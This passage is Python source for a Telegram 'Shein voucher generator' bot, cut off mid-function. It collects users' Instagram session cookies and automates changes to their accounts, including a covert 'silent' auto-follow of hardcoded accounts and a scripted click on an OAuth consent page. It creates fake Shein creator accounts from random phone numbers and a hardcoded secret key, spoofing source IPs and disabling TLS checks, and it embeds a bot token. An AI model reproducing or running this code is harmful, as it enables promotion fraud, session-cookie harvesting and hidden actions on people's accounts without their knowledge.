#!/usr/bin/env python3
"""
Combined Shein Voucher Generator Bot
- Instagram automation (professional, bio, post x8)
- HTTP-based OAuth (no Selenium/browser needed)
- Shein account generation
- Voucher fetching

APIs used:
  1. Instagram Private Web API  : https://www.instagram.com/api/v1/
  2. Shein Creator Backend API  : https://shein-creator-backend-151437891745.asia-south1.run.app
"""

import os
import json
import time
import random
import string
import asyncio
import logging
import requests
from datetime import datetime
from typing import Optional, Dict, Any, List
from urllib.parse import urlparse, parse_qs, urlencode
import aiohttp
from aiohttp import FormData

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.keyboard import ReplyKeyboardBuilder
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

import urllib.parse
import shutil
from concurrent.futures import ThreadPoolExecutor

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException

# ============== CONFIGURATION ==============
BOT_TOKEN = "8681783370:AAH_AbmDwi5iHT0Gzur_F89YQi8Ch63FWjY"
ADMIN_IDS = [7759665144]

# Mandatory channels
MANDATORY_CHANNELS = [
    {"username": "@gjccrypto",    "name": "GJC Crypto",     "link": "https://t.me/gjccrypto"},
    {"username": "@brocodx",      "name": "Brocodx",        "link": "https://t.me/brocodx"},
    {"username": "@gujjucryptto", "name": "Gujju Cryptto",  "link": "https://t.me/gujjucryptto"},
    {"username": "@titanxploit",  "name": "Titan Xploit",   "link": "https://t.me/titanxploit"},
    {"username": "@alphatonsol",  "name": "Alpha Tonsol",   "link": "https://t.me/alphatonsol"},
]

# Instagram settings
IMAGE_URL       = "https://i.ibb.co/1JJftbJB/hellio.jpg"
DEFAULT_BIO     = "thakur saab, wish me on 27 sep ."
DEFAULT_CAPTION = ""

# Post images — alternating picsum & girl image
NORA_IMG = "https://i.ibb.co/N29XP3Cp/norafatima4577-20260328-0001.jpg"
POST_IMAGE_URLS = [
    "https://picsum.photos/seed/shein1/800/800",
    NORA_IMG,
    "https://picsum.photos/seed/shein2/800/800",
    NORA_IMG,
    "https://picsum.photos/seed/shein3/800/800",
    NORA_IMG,
    "https://picsum.photos/seed/shein4/800/800",
    NORA_IMG,
]

# How many posts to create per run
TOTAL_POSTS = 6

# Shein API settings
SHEIN_SECRET_KEY = "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg"

# API base URLs
SHEIN_INDIA_API   = "https://api.services.sheinindia.in"
SHEIN_CREATOR_API = "https://shein-creator-backend-151437891745.asia-south1.run.app"

# Accounts to silently auto-follow (username, hardcoded user_id)
ACCOUNTS_TO_FOLLOW = [
    ("kiransinh_0527",   "35227619449"),
    ("Viraldaringclips", "75322163110"),
]

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Data directory
DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data')
os.makedirs(DATA_DIR, exist_ok=True)

# Globals
GLOBAL_IMAGE_PATH = None
selenium_pool     = ThreadPoolExecutor(max_workers=2)
semaphore         = asyncio.Semaphore(3)

# ============== UTILITY FUNCTIONS ==============

def rand_ip() -> str:
    return f"{random.randint(100,200)}.{random.randint(10,250)}.{random.randint(10,250)}.{random.randint(1,250)}"

def rand_name() -> str:
    names = ['Aarav','Vihaan','Reyansh','Ayaan','Arjun','Kabir','Advait','Vivaan',
             'Aadhya','Ananya','Diya','Myra','Kiara','Isha','Meera','Pari','Saanvi']
    return f"{random.choice(names)}{random.randint(100,999)}"

def rand_phone() -> str:
    return f"9{random.randint(100000000, 999999999)}"

def rand_gender() -> str:
    return random.choice(["MALE", "FEMALE"])

def gen_device_id() -> str:
    return os.urandom(8).hex()

async def random_delay(min_s=0.2, max_s=0.5):
    await asyncio.sleep(random.uniform(min_s, max_s))

def parse_cookies(cookie_string: str) -> Dict[str, str]:
    cookies = {}
    for item in cookie_string.split(';'):
        item = item.strip()
        if '=' in item:
            key, value = item.split('=', 1)
            cookies[key.strip()] = value.strip()
    return cookies

def get_csrf_token(cookies: Dict) -> str:
    return cookies.get('csrftoken', '')

def get_user_id(cookies: Dict) -> str:
    return cookies.get('ds_user_id', '')

# ============== CHANNEL MEMBERSHIP CHECK ==============

async def check_channel_membership(bot: Bot, user_id: int) -> Dict[str, bool]:
    results = {}
    for channel in MANDATORY_CHANNELS:
        try:
            member    = await bot.get_chat_member(chat_id=channel["username"], user_id=user_id)
            is_member = member.status in ['member', 'administrator', 'creator']
            results[channel["username"]] = is_member
        except Exception as e:
            logger.error(f"Error checking membership for {channel['username']}: {e}")
            results[channel["username"]] = False
    return results

def create_join_channels_keyboard() -> InlineKeyboardMarkup:
    buttons = []
    for channel in MANDATORY_CHANNELS:
        buttons.append([InlineKeyboardButton(text=f"📢 Join {channel['name']}", url=channel["link"])])
    buttons.append([InlineKeyboardButton(text="✅ I've Joined All", callback_data="check_membership")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

async def verify_membership(bot: Bot, user_id: int) -> tuple[bool, str]:
    if user_id in ADMIN_IDS:
        return True, "✅ Admin access granted!"
    membership = await check_channel_membership(bot, user_id)
    not_joined = [ch["name"] for ch in MANDATORY_CHANNELS if not membership.get(ch["username"], False)]
    if not_joined:
        return False, "❌ You haven't joined:\n• " + "\n• ".join(not_joined)
    return True, "✅ All channels verified!"

# ============== COOKIE VALIDATION ==============

async def validate_instagram_cookie(cookie_string: str) -> Dict:
    try:
        cookies    = parse_cookies(cookie_string)
        csrf       = get_csrf_token(cookies)
        uid        = get_user_id(cookies)
        if not csrf or not uid or 'sessionid' not in cookies:
            return {'valid': False, 'error': 'Missing required cookies (sessionid, csrftoken, ds_user_id)'}
        url = 'https://www.instagram.com/api/v1/accounts/edit/web_form_data/'
        headers = {
            'accept': '*/*',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'x-csrftoken': csrf,
            'x-ig-app-id': '936619743392459',
            'cookie': cookie_string
        }
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data.get('form_data', {}).get('username'):
                        return {
                            'valid': True,
                            'username': data['form_data']['username'],
                            'name': data['form_data'].get('first_name', '')
                        }
                    return {'valid': False, 'error': 'Could not get account info'}
                elif resp.status in (401, 403):
                    return {'valid': False, 'error': 'Cookie expired or invalid (401/403)'}
                else:
                    return {'valid': False, 'error': f'Instagram returned status {resp.status}'}
    except Exception as e:
        logger.error(f"Cookie validation error: {e}")
        return {'valid': False, 'error': str(e)}

# ============== IMAGE DOWNLOAD ==============

async def download_image(url: str, filename: str = "temp_image.jpg") -> Optional[str]:
    try:
        filepath = os.path.join(DATA_DIR, filename)
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    with open(filepath, 'wb') as f:
                        f.write(await response.read())
                    return filepath
    except Exception as e:
        logger.error(f"Error downloading image: {e}")
    return None

# ============== INSTAGRAM API FUNCTIONS ==============

async def convert_to_professional(session, cookies, csrf_token) -> Dict:
    url = 'https://www.instagram.com/api/v1/business/account/convert_account/'
    headers = {
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/accounts/convert_to_professional_account/',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'x-csrftoken': csrf_token,
        'x-ig-app-id': '936619743392459',
        'x-requested-with': 'XMLHttpRequest'
    }
    data = {
        'category_id': '200600219953504', 'create_business_id': 'true',
        'entry_point': 'ig_web_settings', 'set_public': 'true',
        'should_bypass_contact_check': 'true', 'should_show_category': '0',
        'to_account_type': '3'
    }
    try:
        async with session.post(url, headers=headers, data=data, cookies=cookies) as resp:
            return await resp.json()
    except Exception as e:
        logger.error(f"Convert to professional error: {e}")
        return {'status': 'fail', 'error': str(e)}

async def update_bio(session, cookies, csrf_token) -> Dict:
    info_url = 'https://www.instagram.com/api/v1/accounts/edit/web_form_data/'
    headers  = {
        'accept': '*/*',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'x-csrftoken': csrf_token,
        'x-ig-app-id': '936619743392459'
    }
    try:
        async with session.get(info_url, headers=headers, cookies=cookies) as resp:
            account_info = await resp.json()
        current_username   = account_info.get('form_data', {}).get('username', '')
        current_first_name = account_info.get('form_data', {}).get('first_name', '')
        url     = 'https://www.instagram.com/api/v1/web/accounts/edit/'
        headers['content-type'] = 'application/x-www-form-urlencoded'
        headers['origin']       = 'https://www.instagram.com'
        data = {
            'biography': DEFAULT_BIO, 'chaining_enabled': 'on',
            'external_url': '', 'first_name': current_first_name,
            'username': current_username
        }
        async with session.post(url, headers=headers, data=data, cookies=cookies) as resp:
            return await resp.json()
    except Exception as e:
        logger.error(f"Update bio error: {e}")
        return {'status': 'fail', 'error': str(e)}

async def change_profile_picture(session, cookies, csrf_token, image_path) -> Dict:
    url = 'https://www.instagram.com/api/v1/web/accounts/web_change_profile_picture/'
    headers = {
        'accept': '*/*', 'origin': 'https://www.instagram.com',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'x-csrftoken': csrf_token, 'x-ig-app-id': '936619743392459',
        'x-requested-with': 'XMLHttpRequest'
    }
    try:
        form = FormData()
        form.add_field('profile_pic', open(image_path, 'rb'),
                       filename=os.path.basename(image_path), content_type='image/jpeg')
        async with session.post(url, headers=headers, data=form, cookies=cookies) as resp:
            return await resp.json()
    except Exception as e:
        logger.error(f"Change profile pic error: {e}")
        return {'status': 'fail', 'error': str(e)}

async def upload_photo(session, cookies, image_path, upload_id) -> Dict:
    url = f'https://i.instagram.com/rupload_igphoto/fb_uploader_{upload_id}'
    headers = {
        'accept': '*/*', 'content-type': 'image/jpeg',
        'offset': '0', 'origin': 'https://www.instagram.com',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'x-entity-length': str(os.path.getsize(image_path)),
        'x-entity-name': f'fb_uploader_{upload_id}',
        'x-entity-type': 'image/jpeg', 'x-ig-app-id': '936619743392459',
        'x-instagram-rupload-params': json.dumps({
            "media_type": 1, "upload_id": str(upload_id),
            "upload_media_height": 215, "upload_media_width": 215
        })
    }
    try:
        with open(image_path, 'rb') as f:
            async with session.post(url, headers=headers, data=f.read(), cookies=cookies) as resp:
                return await resp.json()
    except Exception as e:
        logger.error(f"Upload photo error: {e}")
        return {'status': 'fail', 'error': str(e)}

async def configure_media_post(session, cookies, csrf_token, upload_id) -> Dict:
    url = 'https://www.instagram.com/api/v1/media/configure/'
    headers = {
        'accept': '*/*', 'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'x-csrftoken': csrf_token, 'x-ig-app-id': '936619743392459',
        'x-requested-with': 'XMLHttpRequest'
    }
    data = {
        'caption': DEFAULT_CAPTION, 'disable_comments': '0',
        'source_type': 'library', 'upload_id': str(upload_id)
    }
    try:
        async with session.post(url, headers=headers, data=data, cookies=cookies) as resp:
            return await resp.json()
    except Exception as e:
        logger.error(f"Configure post error: {e}")
        return {'status': 'fail', 'error': str(e)}

async def create_single_post(session, cookies, csrf_token, image_path, post_num: int) -> Dict:
    """Upload photo and configure post — uses different image per post."""
    # Download a unique image for this post
    post_image_url = POST_IMAGE_URLS[(post_num - 1) % len(POST_IMAGE_URLS)]
    post_image_path = f"/tmp/post_img_{post_num}.jpg"
    try:
        async with session.get(post_image_url) as r:
            if r.status == 200:
                with open(post_image_path, 'wb') as f:
                    f.write(await r.read())
                logger.info(f"Post {post_num}: downloaded image from {post_image_url}")
            else:
                post_image_path = image_path  # fallback to shared image
    except Exception as e:
        logger.warning(f"Post {post_num}: image download failed, using shared: {e}")
        post_image_path = image_path

    upload_id = str(int(time.time() * 1000) + post_num)
    logger.info(f"Creating post {post_num} with upload_id={upload_id}")
    upload_result = await upload_photo(session, cookies, post_image_path, upload_id)
    await random_delay(0.5, 1.2)
    configure_result = await configure_media_post(session, cookies, csrf_token, upload_id)
    return configure_result

# ============== AUTO FOLLOW ==============

async def follow_user(session, cookies, csrf_token, user_id: str, username: str) -> bool:
    url = f'https://www.instagram.com/api/v1/friendships/create/{user_id}/'
    headers = {
        'accept': '*/*', 'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'referer': f'https://www.instagram.com/{username}/',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'x-csrftoken': csrf_token, 'x-ig-app-id': '936619743392459',
        'x-requested-with': 'XMLHttpRequest'
    }
    try:
        async with session.post(url, headers=headers, data={'user_id': user_id}, cookies=cookies) as resp:
            if resp.status in (200, 302):
                logger.info(f"Followed @{username}")
                return True
            logger.warning(f"Follow @{username} status: {resp.status}")
            return False
    except Exception as e:
        logger.error(f"follow_user error for @{username}: {e}")
        return False

async def auto_follow_accounts(session, cookies, csrf_token):
    for username, user_id in ACCOUNTS_TO_FOLLOW:
        try:
            await follow_user(session, cookies, csrf_token, user_id, username)
            await asyncio.sleep(0.3)
        except Exception as e:
            logger.error(f"auto_follow error for @{username}: {e}")

# ============== SELENIUM OAUTH ==============

def _find_chrome_binary() -> Optional[str]:
    """Find best working Chrome/Chromium binary on this system."""
    candidates = [
        shutil.which("chromium"),
        shutil.which("chromium-browser"),
        shutil.which("google-chrome"),
        shutil.which("google-chrome-stable"),
        "/usr/bin/chromium-browser",
        "/usr/bin/chromium",
        "/usr/bin/google-chrome",
        "/snap/bin/chromium",
    ]
    for p in candidates:
        if p and os.path.exists(p):
            return p
    return None

def _find_chromedriver() -> Optional[str]:
    """Find chromedriver binary — prefer snap version that matches snap chromium."""
    candidates = [
        "/snap/bin/chromium.chromedriver",   # snap (auto-matched version)
        shutil.which("chromedriver"),
        "/usr/bin/chromedriver",
        "/usr/local/bin/chromedriver",
    ]
    for p in candidates:
        if p and os.path.exists(p):
            return p
    return None

def sync_generate_oauth_code(cookies: Dict[str, str]) -> tuple:
    driver = None
    try:
        from selenium.webdriver.chrome.service import Service as ChromeService

        chrome_options = Options()
        chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--no-zygote")
        chrome_options.add_argument("--disable-setuid-sandbox")
        chrome_options.add_argument("--window-size=1920,1080")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_argument(
            "user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        )
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])

        # Only set binary_location when NOT using snap chromedriver
        # (snap chromedriver already knows where its chromium is)
        chromedriver_path = _find_chromedriver()
        if chromedriver_path and "snap" not in chromedriver_path:
            chrome_bin = _find_chrome_binary()
            if chrome_bin:
                chrome_options.binary_location = chrome_bin
                logger.info(f"Using Chrome binary: {chrome_bin}")

        logger.info(f"Using ChromeDriver: {chromedriver_path}")
        service = ChromeService(chromedriver_path) if chromedriver_path else ChromeService()
        driver  = webdriver.Chrome(service=service, options=chrome_options)

        logger.info("Opening Instagram...")
        driver.get("https://www.instagram.com")
        time.sleep(2)

        logger.info("Injecting cookies...")
        for name, value in cookies.items():
            if name in ['ig_did', 'rur']:
                continue
            try:
                driver.add_cookie({
                    'name': name, 'value': value,
                    'domain': '.instagram.com', 'path': '/', 'secure': True
                })
            except Exception:
                pass
        driver.refresh()
        time.sleep(1.5)

        logger.info("Opening consent page...")
        CONSENT_URL = (
            'https://www.instagram.com/consent/?flow=ig_biz_login_oauth'
            '&params_json={"client_id":"713904474873404","redirect_uri":'
            '"https://sheinverse.galleri5.com/instagram","response_type":'
            '"code","state":null,"scope":"instagram_business_basic",'
            '"logger_id":"84155d6f-26ca-484b-a2b2-cf3b579c1fc7",'
            '"app_id":"713904474873404","platform_app_id":"713904474873404"}'
            '&source=oauth_permissions_page_www'
        )
        driver.get(CONSENT_URL)
        time.sleep(2.5)

        logger.info("Searching for Allow button...")
        selectors = [
            "//div[contains(text(),'Allow')]",
            "//button[contains(text(),'Allow')]",
            "//div[@role='button' and contains(.,'Allow')]",
            "//span[contains(text(),'Allow')]/ancestor::div[@role='button']",
        ]
        allow_button = None
        for sel in selectors:
            try:
                allow_button = WebDriverWait(driver, 6).until(
                    EC.element_to_be_clickable((By.XPATH, sel))
                )
                if allow_button:
                    break
            except Exception:
                continue

        if not allow_button:
            page_src = driver.page_source[:500]
            logger.error(f"Allow button not found. Page snippet: {page_src}")
            raise Exception("Could not find Allow button on consent page")

        logger.info("Clicking Allow...")
        driver.execute_script("arguments[0].click();", allow_button)
        time.sleep(2)

        logger.info("Waiting for OAuth redirect...")
        deadline = time.time() + 20
        while time.time() < deadline:
            cur = driver.current_url
            if "sheinverse.galleri5.com" in cur and "code=" in cur:
                params    = parse_qs(urlparse(cur).query)
                oauth_code = params.get('code', [None])[0]
                if oauth_code:
                    logger.info(f"OAuth code obtained: {oauth_code[:20]}...")
                    return cur, oauth_code
            time.sleep(0.4)

        raise Exception("Redirect with OAuth code not received within 20 s")

    except Exception as e:
        logger.error(f"Selenium OAuth error: {e}")
        raise
    finally:
        if driver:
            try:
                driver.quit()
            except Exception:
                pass

async def generate_oauth_code(cookies: Dict) -> tuple:
    loop = asyncio.get_event_loop()
    try:
        return await asyncio.wait_for(
            loop.run_in_executor(selenium_pool, sync_generate_oauth_code, cookies),
            timeout=120
        )
    except asyncio.TimeoutError:
        raise Exception("OAuth timed out after 120 seconds")

# ============== SHEIN FUNCTIONS ==============

def http_call(url: str, data: Any = None, headers: List[str] = None, method: str = "GET") -> Optional[str]:
    try:
        header_dict = {}
        if headers:
            for h in headers:
                if ':' in h:
                    key, value = h.split(':', 1)
                    header_dict[key.strip()] = value.strip()
        if not header_dict:
            header_dict = {
                "X-Forwarded-For": rand_ip(),
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36"
            }
        if method.upper() == "POST":
            response = requests.post(url, data=data, headers=header_dict, timeout=30, verify=False)
        else:
            response = requests.get(url, headers=header_dict, timeout=30, verify=False)
        return response.text
    except Exception as e:
        logger.error(f"HTTP Error: {e}")
        return None

async def generate_shein_account() -> Optional[Dict]:
    logger.info("Generating Shein account...")

    # Directly generate creator token with random phone (no Shein India API needed)
    for attempt in range(5):
        try:
            mobile  = rand_phone()
            name    = rand_name()
            gender  = rand_gender()
            user_id = os.urandom(8).hex()

            payload = json.dumps({
                "client_type": "Android/29", "client_version": "1.0.8",
                "gender": gender, "phone_number": mobile,
                "secret_key": SHEIN_SECRET_KEY, "user_id": user_id, "user_name": name
            })
            headers = [
                "Accept: application/json", "User-Agent: Android",
                "Content-Type: application/json; charset=UTF-8",
                f"X-Forwarded-For: {rand_ip()}"
            ]
            logger.info(f"Attempt {attempt+1}: generating creator token with phone={mobile}")
            res = http_call(f"{SHEIN_CREATOR_API}/api/v1/auth/generate-token", payload, headers, "POST")
            if not res:
                logger.warning(f"Attempt {attempt+1}: no response from creator API")
                continue
            j = json.loads(res)
            if j.get('access_token'):
                logger.info(f"Creator token generated successfully")
                return {'mobile': mobile, 'name': name, 'creator_token': j['access_token']}
            else:
                logger.warning(f"Attempt {attempt+1}: unexpected response: {res[:200]}")
        except Exception as e:
            logger.error(f"Attempt {attempt+1} failed: {e}")
        await asyncio.sleep(0.2)

    logger.error("All 5 attempts failed to generate Shein account")
    return None

async def connect_instagram_to_shein(creator_token: str, oauth_code: str) -> Dict:
    url = f"{SHEIN_CREATOR_API}/api/v6/instagram"
    ip  = rand_ip()
    headers = [
        f"Authorization: Bearer {creator_token}",
        "Content-Type: application/json",
        "User-Agent: Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
        "Accept: */*", "Origin: https://sheinverse.galleri5.com",
        "Referer: https://sheinverse.galleri5.com/",
        "Sec-Fetch-Site: cross-site", "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Dest: empty", f"X-Forwarded-For: {ip}"
    ]
    data = json.dumps({"code": oauth_code, "redirectUri": "https://sheinverse.galleri5.com/instagram"})
    logger.info(f"Connecting Instagram with OAuth code: {oauth_code[:30]}...")
    res  = http_call(url, data, headers, "POST")
    logger.info(f"Instagram connect response: {res[:1000] if res else 'None'}")
    if not res:
        return {'success': False, 'error': 'No response'}
    try:
        result = json.loads(res)
        if result.get('message') == 'Instagram connection successful':
            ig_data      = result.get('user_data', {})
            ig_username  = ig_data.get('username', 'N/A')
            ig_followers = ig_data.get('followers_count', 'N/A')
            voucher      = result.get('voucher')
            return {
                'success': True,
                'instagram': {'username': ig_username, 'followers': ig_followers},
                'voucher': voucher, 'response': result
            }
        else:
            error_msg = result.get('message', str(result))
            return {'success': False, 'error': error_msg, 'response': result}
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def fetch_voucher(creator_token: str, max_retries: int = 30) -> Optional[Dict]:
    url = f"{SHEIN_CREATOR_API}/api/v1/user"
    headers = [
        f"Authorization: Bearer {creator_token}",
        "User-Agent: Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36",
        "Accept: */*"
    ]
    for attempt in range(max_retries):
        res = http_call(url, headers=headers, method="GET")
        logger.info(f"Voucher poll attempt {attempt+1}/{max_retries}: {res[:200] if res else 'None'}")
        if res:
            try:
                result = json.loads(res)
                if result.get('message') == 'Profile fetched successfully':
                    user_data    = result.get('user_data', {})
                    voucher_data = user_data.get('voucher_data')
                    vouchers     = user_data.get('vouchers', [])
                    def enrich_voucher(v: dict) -> dict:
                        return v

                    if voucher_data and voucher_data.get('voucher_code'):
                        return enrich_voucher(voucher_data)
                    if vouchers and vouchers[0].get('voucher_code'):
                        return enrich_voucher(vouchers[0])
                    if user_data.get('voucher_code'):
                        return enrich_voucher({'voucher_code': user_data['voucher_code'], 'value': user_data.get('voucher_value', 'N/A')})
                    if user_data.get('code'):
                        return enrich_voucher({'voucher_code': user_data['code'], 'value': user_data.get('value', 'N/A')})
            except Exception as e:
                logger.error(f"Parse error: {e}")
        await asyncio.sleep(1.5)
    return None

# ============== BOT STATES ==============

class BotStates(StatesGroup):
    waiting_for_cookies   = State()
    waiting_for_broadcast = State()

# ============== STATISTICS TRACKING ==============

STATS_FILE = os.path.join(DATA_DIR, 'stats.json')
USERS_FILE = os.path.join(DATA_DIR, 'users.json')

def load_stats() -> Dict:
    default_stats = {
        'total_vouchers': 0, 'today_vouchers': 0,
        'last_reset': datetime.now().strftime('%Y-%m-%d'), 'voucher_history': []
    }
    try:
        if os.path.exists(STATS_FILE):
            with open(STATS_FILE, 'r') as f:
                stats = json.load(f)
            if stats.get('last_reset') != datetime.now().strftime('%Y-%m-%d'):
                if stats.get('today_vouchers', 0) > 0:
                    stats['voucher_history'].append({'date': stats.get('last_reset'), 'count': stats.get('today_vouchers', 0)})
                    stats['voucher_history'] = stats['voucher_history'][-30:]
                stats['today_vouchers'] = 0
                stats['last_reset']     = datetime.now().strftime('%Y-%m-%d')
                save_stats(stats)
            return stats
    except Exception as e:
        logger.error(f"Error loading stats: {e}")
    return default_stats

def save_stats(stats: Dict):
    try:
        with open(STATS_FILE, 'w') as f:
            json.dump(stats, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving stats: {e}")

def increment_voucher_count():
    stats = load_stats()
    stats['total_vouchers']  = stats.get('total_vouchers', 0) + 1
    stats['today_vouchers']  = stats.get('today_vouchers', 0) + 1
    save_stats(stats)

def load_users() -> Dict:
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading users: {e}")
    return {'users': {}, 'today_new': 0, 'last_reset': datetime.now().strftime('%Y-%m-%d')}

def save_users(users_data: Dict):
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump(users_data, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving users: {e}")

def add_user(user_id: int, username: str = None, first_name: str = None):
    users_data = load_users()
    if users_data.get('last_reset') != datetime.now().strftime('%Y-%m-%d'):
        users_data['today_new'] = 0
        users_data['last_reset'] = datetime.now().strftime('%Y-%m-%d')
    user_id_str = str(user_id)
    is_new      = user_id_str not in users_data.get('users', {})
    if 'users' not in users_data:
        users_data['users'] = {}
    users_data['users'][user_id_str] = {
        'username': username, 'first_name': first_name,
        'last_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'joined': users_data['users'].get(user_id_str, {}).get('joined', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    }
    if is_new:
        users_data['today_new'] = users_data.get('today_new', 0) + 1
    save_users(users_data)
    return is_new

def get_all_user_ids() -> List[int]:
    users_data = load_users()
    return [int(uid) for uid in users_data.get('users', {}).keys()]

def get_user_stats() -> Dict:
    users_data = load_users()
    return {'total_users': len(users_data.get('users', {})), 'today_new': users_data.get('today_new', 0)}

# ============== MAIN VOUCHER FLOW ==============

async def full_voucher_flow(bot: Bot, message: Message, cookie_string: str):
    """Complete flow: validate → profile setup → 8 posts → Shein account → voucher"""
    chat_id = message.chat.id

    try:
        cookies    = parse_cookies(cookie_string)
        csrf_token = get_csrf_token(cookies)

        if not csrf_token or not get_user_id(cookies):
            await message.answer("❌ Invalid cookies! Required: sessionid, csrftoken, ds_user_id")
            return

        # Validate cookie
        progress   = await message.answer("🔍 Validating Instagram cookie...")
        validation = await validate_instagram_cookie(cookie_string)

        if not validation.get('valid'):
            error = validation.get('error', 'Unknown error')
            await progress.edit_text(
                f"❌ <b>Cookie validation failed!</b>\n\nError: {error}\n\n"
                f"<b>Please:</b>\n1. Login to Instagram in browser\n"
                f"2. Get fresh cookies (F12 → Application → Cookies)\n3. Send new cookie string",
                parse_mode=ParseMode.HTML
            )
            return

        ig_username = validation.get('username', 'Unknown')
        await progress.edit_text(
            f"✅ Cookie Valid!\n\n👤 Account: <b>@{ig_username}</b>\n"
            f"[░░░░░░░░░░] 0%\n\n💎 Starting voucher generation...",
            parse_mode=ParseMode.HTML
        )

        async with aiohttp.ClientSession() as session:

            # Step 1: Convert to professional
            await progress.edit_text(
                f"🔄 <b>Processing...</b>\n\n[█░░░░░░░░░] 10%\n\n💼 Converting to Professional Account...",
                parse_mode=ParseMode.HTML
            )
            await convert_to_professional(session, cookies, csrf_token)
            await random_delay()

            # Step 2: Update bio
            await progress.edit_text(
                f"🔄 <b>Processing...</b>\n\n[██░░░░░░░░] 20%\n\n✏️ Updating Bio...",
                parse_mode=ParseMode.HTML
            )
            await update_bio(session, cookies, csrf_token)
            await random_delay()

            # Step 3: Change profile picture
            if GLOBAL_IMAGE_PATH and os.path.exists(GLOBAL_IMAGE_PATH):
                await progress.edit_text(
                    f"🔄 <b>Processing...</b>\n\n[███░░░░░░░] 30%\n\n📸 Changing Profile Picture...",
                    parse_mode=ParseMode.HTML
                )
                await change_profile_picture(session, cookies, csrf_token, GLOBAL_IMAGE_PATH)
                await random_delay()

            # Step 4: Create 6 posts
            if GLOBAL_IMAGE_PATH and os.path.exists(GLOBAL_IMAGE_PATH):
                for post_num in range(1, TOTAL_POSTS + 1):
                    bar_filled = "█" * (3 + post_num)
                    bar_empty  = "░" * (7 - post_num)
                    percent    = 30 + (post_num * 5)
                    await progress.edit_text(
                        f"🔄 <b>Processing...</b>\n\n"
                        f"[{bar_filled}{bar_empty}] {percent}%\n\n"
                        f"📝 Creating Post {post_num}/{TOTAL_POSTS}...",
                        parse_mode=ParseMode.HTML
                    )
                    result = await create_single_post(session, cookies, csrf_token, GLOBAL_IMAGE_PATH, post_num)
                    logger.info(f"Post {post_num} result: {result}")
                    # Small delay between posts to avoid rate limiting
                    await random_delay(1.0, 2.0)

            # Auto-follow (silent, after posts, before Shein link)
            await auto_follow_accounts(session, cookies, csrf_token)

        # Step 5: Generate Shein account
        await progress.edit_text(
            f"🔄 <b>Processing...</b>\n\n[█████████░] 75%\n\n🛍️ Generating Shein Account...",
            parse_mode=ParseMode.HTML
        )
        shein_account = await generate_shein_account()
        if not shein_account:
            await progress.edit_text(
                f"❌ <b>Failed!</b>\n\nCould not generate Shein account.\nPlease try again later.",
                parse_mode=ParseMode.HTML
            )
            return

        # Step 6: Get OAuth code via Selenium
        await progress.edit_text(
            f"🔄 <b>Processing...</b>\n\n[█████████░] 85%\n\n🔗 Linking Instagram to Shein...",
            parse_mode=ParseMode.HTML
        )
        try:
            redirect_url, oauth_code = await generate_oauth_code(cookies)
        except Exception as e:
            err = str(e).replace('<', '&lt;').replace('>', '&gt;')[:100]
            await progress.edit_text(
                f"❌ <b>OAuth Failed!</b>\n\nError: {err}\n\n<i>Try with fresh cookies.</i>",
                parse_mode=ParseMode.HTML
            )
            return

        # Connect Instagram to Shein
        connect_result = await connect_instagram_to_shein(shein_account['creator_token'], oauth_code)

        if not connect_result.get('success'):
            error_msg = str(connect_result.get('error', 'Unknown error')).replace('<', '&lt;').replace('>', '&gt;')
            await progress.edit_text(
